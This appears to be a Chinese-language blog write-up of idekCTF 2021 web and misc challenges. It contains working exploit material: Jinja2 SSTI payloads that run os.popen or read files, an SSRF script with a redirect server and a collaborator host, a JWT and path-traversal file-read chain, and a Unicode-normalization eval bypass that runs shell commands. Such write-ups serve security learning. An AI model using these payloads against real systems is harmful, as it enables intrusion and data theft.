---
title: "idekCTF2021 Wp"
slug: "idekctf2021-wp"
description: "只有部分的web，js别问，问就是不会"
date: 2021-12-15T21:11:49+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://ctf.idek.team/Challenges 注册之后一直收不到验证邮件，gmail和qq邮箱都不行，但是好像可以直接看题

## Memory of PHP

> Try to understand how string and variable work in php and also url.
> http://memory-of-php.rf.gd/

```php
<?php

include(__DIR__."/lib.php");
$check = substr($_SERVER['QUERY_STRING'], 0, 32);
if (preg_match("/best-team/i", $check))
{
    echo "Who is the best team?";
}
if ($_GET['best-team'] === "idek_is_the_best")
{
    echo "That a right answer, Here is my prize, <br>";
    echo $flag;
}
show_source(__FILE__);
?>
```

```
/?best-team=idek_is_the_best
```

![image-20211212011843966](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212011843966.png)

进入http://memory-of-php.rf.gd/secure-bypass.php

```php
<?php
include __DIR__."/lib2.php";
if (isset($_GET['url'][15]))
{
    header("location: {$_GET['url']}");
    echo "Your url is interesting, here is prize {$flag} <br>";
}
else
{
    echo "Plz make me interest with your url <br>";
}
show_source(__FILE__);
?>
```

```
/secure-bypass.php?url[15]=1
```

![image-20211212090944967](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212090944967.png)

`idek{nu11_by1e_bypass1ng_1s_C0ol!_ftw_br0!!!!}`

## Cookie-and-milk

> I love to eat cookie and milk together. And you?
>
> http://cookie-and-milk.rf.gd/

```php
<?php

include(__DIR__."/lib.php");
extract($_GET);

if ($_SESSION['idek'] === $_COOKIE['idek'])
{
    echo "I love c0000000000000000000000000000000000000kie";
}

else if ( sha1($_SESSION['idek']) == sha1($_COOKIE['idek']) )
{
    echo $flag;
}

show_source(__FILE__);
?>
```

![image-20211212100510880](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212100510880.png)

比较狗的一点是它重定向的时候会删除我们的cookie，所以要单独抓包改一下

`idek{C0okie_s1ea1ing_1s_c0ol!!!}`

## difference-check

> It's important two know what differences exist, so I created a simple tool to check the difference between two websites!
>
> http://difference-check.chal.idek.team |  https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip

可以提供两个url，会进行diff然后返回结果

![image-20211212091244418](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212091244418.png)

使用的是node-fetch和diff库；康一康源码

```js
const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const ssrfFilter = require('ssrf-req-filter');
const fetch = require('node-fetch');
const Diff = require('diff');
const hbs = require('express-handlebars');
const port = 1337;
const flag = 'idek{REDACTED}';


app.use(bodyParser.urlencoded({ extended: true }));
app.engine('hbs', hbs.engine({
    defaultLayout: 'main',
    extname: '.hbs'
}));

app.set('view engine', 'hbs');


async function validifyURL(url){
	valid = await fetch(url, {agent: ssrfFilter(url)})
	.then((response) => {
		return true
	})
	.catch(error => {
		return false
	});
	return valid;
};

async function diffURLs(urls){
	try{
		const pageOne = await fetch(urls[0]).then((r => {return r.text()}));
		const pageTwo = await fetch(urls[1]).then((r => {return r.text()}));
		return Diff.diffLines(pageOne, pageTwo)
	} catch {
		return 'error!'
	}
};

app.get('/', (req, res) => {
	res.render('index');
});

app.get('/flag', (req, res) => {
	if(req.connection.remoteAddress == '::1'){
		res.send(flag)}
	else{
		res.send("Forbidden", 503)}
});

app.post('/diff', async (req, res) => {
	let { url1, url2 } = req.body
	if(typeof url1 !== 'string' || typeof url2 !== 'string'){
		return res.send({error: 'Invalid format received'})
	};
	let urls = [url1, url2];
	for(url of urls){
		const valid = await validifyURL(url);
		if(!valid){
			return res.send({error: `Request to ${url} was denied`});
		};
	};
	const difference = await diffURLs(urls);
	res.render('diff', {
		lines: difference
	});

});

app.listen(port, () => {
	console.log(`App listening at http://localhost:${port}`)
});

```

可以看到对请求的url用`ssrfFilter`进行过滤，不允许访问本地的`/flag`，但是要flag就必须要ssrf，这里Node的版本是alpine，也没法进行http请求切分

于是我尝试构造一个恶意html页面包含一个跳转的js脚本，但是学艺不精 构造失败了；随后我又尝试了DNS重绑定，但是会被检测出来导致利用失败

![image-20211213132823135](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132823135.png)

后来看了discord中的解答

![image-20211215212432931](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211215212432931.png)

所以说重绑定还是可行的，因为在一个域名被反复横跳地解析ip地址，如果第一次被解析为我们服务器地地址而第二次返回127.0.0.1就可以达到SSRF地效果了；不过看wp之后发现直接用python会更简单

```python
from flask import Flask, redirect
from threading import Thread
import requests

local_url = "http://yourvps_ip:port/"
app = Flask(__name__)
reqCounter = 0

@app.route('/')
def exploit():
    global reqCounter
    if reqCounter == 0:
        reqCounter += 1
        return 'hey'
    else:
        reqCounter -= 1
        return redirect('http://localhost:1337/flag')

def start_server():
    app.run('0.0.0.0', 88)

def send_payload():
    url = "http://difference-check.chal.idek.team/diff"
    payload = {"url1": local_url, "url2": "http://v3zbv72qksii3rrtyl113zsi096zuo.burpcollaborator.net/"}
    r = requests.post(url, data=payload)
    print(r.text)

if __name__ == '__main__':
    Thread(target=start_server).start()
    Thread(target=send_payload).start()

```

![image-20211213132943376](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213132943376.png)

`idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}`

使用重定向的方式，避开ssrfFilter的过滤，学到了

## Sourceless Guessy Web

> "If it has a website its web"
>
> https://sgw.chal.imaginaryctf.org/

首页上没东西，就两行字

![image-20211212015231115](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211212015231115.png)

而且也不能爆破，尝试了经典路由都没什么反应，看审查元素

![image-20211213135213779](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213135213779.png)

抓包会看到响应头一直带着`report-uri="https://sentry.repl.it/api/10/security/?sentry_key=xxxx`这样的东西，访问`https://sgw.chal.imaginaryctf.org/__repl`就会看到源码了

![image-20211213234458242](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213234458242.png)

`idek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}`

## JinJail&Baby JinJail

> I've looked all over the internet for payloads or techniques to bypass my SSTI filter, but none would work! Surely this is secure?
>
> http://jinjail.chal.idek.team  |  https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip

> Jinjail was a bit harder than anticipated, so here's a baby version without the character limit to familiarize yourself with some jinja2 SSTI techniques!
>
> http://baby-jinjail.chal.idek.team  |  https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip

![image-20211213165127940](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213165127940.png)

（这个图里注释有一些不对的地方 懒得改了

构造卡到我的地方是禁用了单双引号，一般情况下过滤引号可以使用`chr()`来表示字符，但是这个方法有需要用到数字；我们现在需要的是一个纯字母的SSTI payload

```python
# official payload
{{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}}
```

`lipsum`跟`url_for`, `get_flashed_messages`一样是一个在flask中的内置函数，比如`url_for`可以这样用

```python
{{url_for.__init__}}
```

对于关键字的过滤使用了`(dict()|list)[False]`的方式进行一个绕过，但是说实话我并不清楚这个`False`的用意是什么，如果不带`False`或用了`True`返回的结果都是空的，我也没有查到相关的资料（如果有带师傅看到了请务必指教！！！

还有从discord里看到的其它版本的payload，也是用到了各种各样的过滤器

```python
{{(dict(a=x)|last)[dict(__cl=x,ass__=x)|join][dict(__mro__=x)|last][dict(a=x)|last|count][dict(__subcl=x,asses__=x)|join]()[dict(gc=x)|last|int(base=(dict(aaaaaaaaaaaaaaaaaa=x)|last|count))]()[dict(open=x)|last](dict(fl=x,ag=x)|join)[dict(read=x)|last]()}}
```

如果搭配上`dict()`这样的用法也是可以接`|attr()`的，上面我写的注释并没有考虑到这一点，我的（因为做题的时候还不清楚这些奇妙的过滤器操作，学到咯

```python
{{((((dict|attr(dict(__mro__=x)|first))|last|attr(dict(__subclas=x)|first%2bdict(ses__=x)|first)()))[([a,a,a,a]|length|string%2b[a,a]|length|string%2b[a,a,a]|length|string)|int])(dict(fla=x)|first%2bdict(g=x)|first)|attr(dict(read=_x)|first)()}}
```

![image-20211213140710659](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213140710659.png)

`idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}`

## steghide-as-a-service

> As has long been demonstrated by CTF, only the most 1337 are capable of running steghide. To help bridge this immense skill gap, I created a web based tool for easy embedding of hidden messages.
>
> http://steghide-as-a-service.chal.idek.team/  |  https://ctf.idek.team/handouts/web/SteghideAsAService/saas-dist.zip

跟php的不一样（一般要绕waf拿一个webshell），flask的文件上传考点一般在其他地方，比如一些tricks&SSTI&Cookie伪造这种的，这个题也不例外，是一个LFI

先审一下代码

```python
# app.py
from flask import Flask, request, render_template, make_response, redirect, send_file
import imghdr
from imghdr import tests
import hashlib
from util import *

# https://stackoverflow.com/questions/36870661/imghdr-python-cant-detec-type-of-some-images-image-extension
# there are no bugs here. just patching imghdr
JPEG_MARK = b'\xff\xd8\xff\xdb\x00C\x00\x08\x06\x06' \
            b'\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f'

def test_jpeg1(h, f):
    """JPEG data in JFIF format"""
    if b'JFIF' in h[:23]:
        return 'jpeg'

def test_jpeg2(h, f):
    """JPEG with small header"""
    if len(h) >= 32 and 67 == h[5] and h[:32] == JPEG_MARK:
        return 'jpeg'


def test_jpeg3(h, f):
    """JPEG data in JFIF or Exif format"""
    if h[6:10] in (b'JFIF', b'Exif') or h[:2] == b'\xff\xd8':
        return 'jpeg'

tests.append(test_jpeg1)
tests.append(test_jpeg2)
tests.append(test_jpeg3)


def verify_jpeg(file_path):
    try:
        jpeg = Image.open(file_path)
        jpeg.verify()
        if imghdr.what(file_path) != 'jpeg':
            return False
        return True
    except:
        return False


app = Flask(__name__)
app.config['MAX_CONTENT_LENGTH'] = 2 * 1024 * 1024

@app.route('/')
def index():
    resp = make_response(render_template('upload.html'))
    if not request.cookies.get('session'):
        resp.set_cookie('session', create_token())
    return resp

@app.route('/upload', methods=['POST'])
def upload():
    if not request.cookies.get('session'):
        return redirect('/')
    session = request.cookies.get('session')
    uploaded_file = request.files['file']
    password = request.form['password']
    content = request.form['content']
    upload_name = uploaded_file.filename.replace('../', '') # no traversal!
    output_name = os.path.join('output/', os.path.basename(upload_name))
    image_data = uploaded_file.stream.read()
    image_md5 = hashlib.md5(image_data).hexdigest()
    image_path = f'uploads/{image_md5}.jpeg'
    content_path = f"uploads/{rand_string()}.txt"

    # write temp txt file
    with open(content_path, 'w') as f:
        f.write(content)
        f.close()

    # write temp image file
    with open(image_path, 'wb') as f:
        f.write(image_data)
        f.close()

    # verify jpeg validity
    if not verify_jpeg(image_path):
        return 'File is not a valid JPEG!', 400

    # verify session before using it
    session = verify_token(session)
    if not session:
        return 'Session token invalid!', 400

    # attempt to embed message in image
    try:
        embed_file(content_path, image_path, output_name, password)
    except:
        return 'Embedding failed!', 400

    # append username to output path to prevent vulns
    sanitized_path = f'output/{upload_name}_{session["username"]}'
    try:
        if not os.path.exists(sanitized_path):
            os.rename(output_name, sanitized_path)
    except:
        pass
    try:
        return send_file(sanitized_path)
    except:
        return 'Something went wrong! Check your file name', 400



app.run('0.0.0.0', 1337)

```

```python
# util.py
from PIL import Image
import random
import jwt
import string
import os
from imghdr import tests
import subprocess

priv_key = open('keys/private.pem', 'r').read()


def create_token():
    priv_key = open('keys/private.pem', 'r').read()
    token = jwt.encode({"username": f"guest_{random.randint(1,10000)}"}, priv_key, algorithm='RS256', headers={'pubkey': 'public.pem'})
    return token

def verify_token(token):
    try:
        headers = jwt.get_unverified_header(token)
        pub_key_path = headers['pubkey']
        pub_key_path = pub_key_path.replace('..', '') # no traversal!
        pub_key_path = os.path.join(os.getcwd(), os.path.join('keys/', pub_key_path))
        pub_key = open(pub_key_path, 'rb').read()
        if b'BEGIN PUBLIC KEY' not in pub_key:
            return False
        return jwt.decode(token, pub_key, algorithms=['RS256', 'HS256'])
    except:
        return False

def rand_string():
    return ''.join(random.choice(string.ascii_letters + string.digits) for i in range(32))

def embed_file(embed_file, cover_file, stegfile, password):
    cmd = subprocess.Popen(['steghide', 'embed', '-ef', embed_file, '-cf', cover_file, '-sf', stegfile, '-p', password]).wait(timeout=.5)

def cleanup():
    for f in os.listdir('uploads/'):
        os.remove(os.path.join('uploads/', f))
    for f in os.listdir('output/'):
        os.remove(os.path.join('output/', f))

```

页面上可以以任意的content和passwd上传一个jpg/jpeg文件，之后可以下载`filename.jpg_guest_3295`这样的一个文件，并且我们的jwt会更新，其中username部分就是拼在`.jpg`后面的内容

![image-20211214104631768](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104631768.png)

康关键部分源码

![image-20211214104825347](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214104825347.png)

![image-20211214095218675](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214095218675.png)



![image-20211214103556446](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214103556446.png)

![image-20211214110203558](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211214110203558.png)

利用`os.path.join()`我们可以直接得到一个不受干扰的绝对路径，类似这样

```python
>>> os.path.join('amiz/tmp','/etc/passwd')
'/etc/passwd'
```

上传的文件名是直接拼在`os.path.join`中的，过滤了`../`，我们可以使用`..././`的方式来绕过（过滤之后拼起来正好是`../`，可以做到路径穿越，不过文件名还会有一个`_`下划线，我们的穿越目标路径需要本身就带有下划线使其不穿帮，我们选择`/proc/self/map_files`

验证cookie是否合法的时候是在文件上传之后的事情，所以我们可以用我们上传的文件做public.key

```python
image_data = uploaded_file.stream.read()
image_md5 = hashlib.md5(image_data).hexdigest()
image_path = f'uploads/{image_md5}.jpeg'
```

我们的图片路径就在`/app/uploads/{image_md5}.jpeg`下，是固定可指向的（绝对路径）

所以整个思路就是：先上传一个含有公钥的jpeg图片，之后上传一个正常的jpg图片，这次要修改文件名

```
..././..././..././..././..././proc/self/map
```

再配合我们的jwt，其中的username部分就得是这样

```
files/../../../app/flag.txt
```

pubkey部分指向我们图片的绝对路径

```
/app/uploads/{image_md5}.jpeg
```

这样，上传之后经过拼接 最终路径将会是

```
output/../../../../../proc/self/map_files/../../../app/flag.txt
```

这样在下载时就做到了任意文件读取，得到flag

————肥肠巧妙的思路了！之前做jwt相关的题固定套路都是ssti获取key，伪造cookie就好了，而这个跟文件还有结合，之前没见过

## Misc/Profanity Check

> once tried to filter messages for profanity using a discord bot. I failed. `nc profanity-check.chal.idek.team 1337`
>
> https://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py

```python
#/usr/bin/env python3

from unicodedata import normalize
import random

i = input(">>> ")

for n in range(10000):
  if random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") in i:
    print("Profanity detected. Exiting.")
    exit(0)

i = normalize("NFC", i)

blacklist = ["__", "()", "{", "}", "[", "]", ";", ":", "!", "@", "#", "$", "%", "^", "&", "*", ",", "class", "mro", "sub", "glob"]

for n in blacklist:
  if n in i:
    print("Profanity detected. Exiting.")
    exit(0)

eval(i)

```

很明显需要绕过这个waf来rce，没有被过滤的有单双引号和数字，所以我们可以用八进制，比如这样

```python
eval('\150\145\154\160\50\51\40')
# eval(help())
```

但是这里用8进制并不可以被`eval`执行，因为本地是这样的

![image-20211213115540592](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115540592.png)

但是通过`input`传过去之后会被转义，再加一个反斜杠

![image-20211213115722152](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213115722152.png)

那肯定会想再加反斜杠呗？

![image-20211213120106808](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211213120106808.png)

本来我们的`\`反斜杠是用来做8进制的引导字符的，结果这样处理会变成纯纯的字符串，越描越黑了

显然这样是执行不了命令的（也可能是我知道的太少了，欢迎各位师傅分享），我们这里用unicode的小trick

做题多一点的师傅应该就能明白啥意思了，一个常考的点是注册`ªdmin`的账户来伪造`admin`，这里也是同理；代码中有一个缺陷：先过滤黑名单字符再进行`normalize()`，这会导致特殊的unicode字符会先顺利通过过滤，再被`normalize()`转为正常字符，最终命令执行

这里是个exp

```python
#!/usr/bin/env python3
letters = ['ª', 'ᵇ', 'ᶜ', 'ᵈ', 'ᵉ', 'ᶠ', 'ᵍ', 'ʰ', 'ⁱ', 'ʲ', 'ᵏ', 'ˡ',
           'ᵐ', 'ⁿ', 'º', 'ᵖ', 'ｑ', 'ʳ', 'ˢ', 'ₜ', 'ᵘ', 'ᵛ', 'ʷ', 'ˣ', 'ʸ', 'ᶻ']

# payload = "print(__import__('os').system('ls'))"
payload = "print(__import__('os').system('cat flag.txt'))"
exploit = "ᵉᵛªˡ(''"

for char in payload:
    exploit += f"+ᶜʰʳ({ord(char)})"

exploit += ")"

print(exploit)
# ᵉᵛªˡ(''+ᶜʰʳ(112)+ᶜʰʳ(114)+ᶜʰʳ(105)+ᶜʰʳ(110)+ᶜʰʳ(116)+ᶜʰʳ(40)+ᶜʰʳ(95)+ᶜʰʳ(95)+ᶜʰʳ(105)+ᶜʰʳ(109)+ᶜʰʳ(112)+ᶜʰʳ(111)+ᶜʰʳ(114)+ᶜʰʳ(116)+ᶜʰʳ(95)+ᶜʰʳ(95)+ᶜʰʳ(40)+ᶜʰʳ(39)+ᶜʰʳ(111)+ᶜʰʳ(115)+ᶜʰʳ(39)+ᶜʰʳ(41)+ᶜʰʳ(46)+ᶜʰʳ(115)+ᶜʰʳ(121)+ᶜʰʳ(115)+ᶜʰʳ(116)+ᶜʰʳ(101)+ᶜʰʳ(109)+ᶜʰʳ(40)+ᶜʰʳ(39)+ᶜʰʳ(99)+ᶜʰʳ(97)+ᶜʰʳ(116)+ᶜʰʳ(32)+ᶜʰʳ(102)+ᶜʰʳ(108)+ᶜʰʳ(97)+ᶜʰʳ(103)+ᶜʰʳ(46)+ᶜʰʳ(116)+ᶜʰʳ(120)+ᶜʰʳ(116)+ᶜʰʳ(39)+ᶜʰʳ(41)+ᶜʰʳ(41))
```

更多的相似unicode可以参考这个网站->https://www.compart.com/en/unicode

```
# 这样的也可以捏
ｐｒｉｎｔ(ｏｐｅｎ(ｃｈｒ(102) + ｃｈｒ(108) + ｃｈｒ(97) + ｃｈｒ(103) + ｃｈｒ(46) + ｃｈｒ(116) + ｃｈｒ(120) + ｃｈｒ(116)).ｒｅａｄ(115))
```

参考：[WAF Bypassing with Unicode Compatibility](https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html)

------

少了三道js的题，我的，下次一定！

另外steghide-as-a-service这道题感谢师傅的帮助（我自己卡到一个很蠢的地方了

最近有点摆烂，属于是春困秋乏里面的冬眠了，我尽量保持一个好的状态
